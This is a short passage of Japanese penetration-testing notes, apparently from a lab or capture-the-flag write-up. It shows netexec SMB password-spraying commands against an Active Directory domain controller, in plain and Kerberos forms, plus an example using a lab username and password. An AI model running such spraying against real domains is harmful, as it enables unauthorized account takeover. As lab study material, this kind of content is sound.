...
```shell
netexec smb <DC_IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>'　--continue-on-success
```
...
- **ミスっていると全くダメです**
```sh
netexec smb <FQDN_Domain_Name> -u 'valid_ad_users' -p '<PASSWORD_TO_SPRAY>' -d <Domain_Name> -k
```

例
```sh
netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k
```
### DomainPasswordSpray
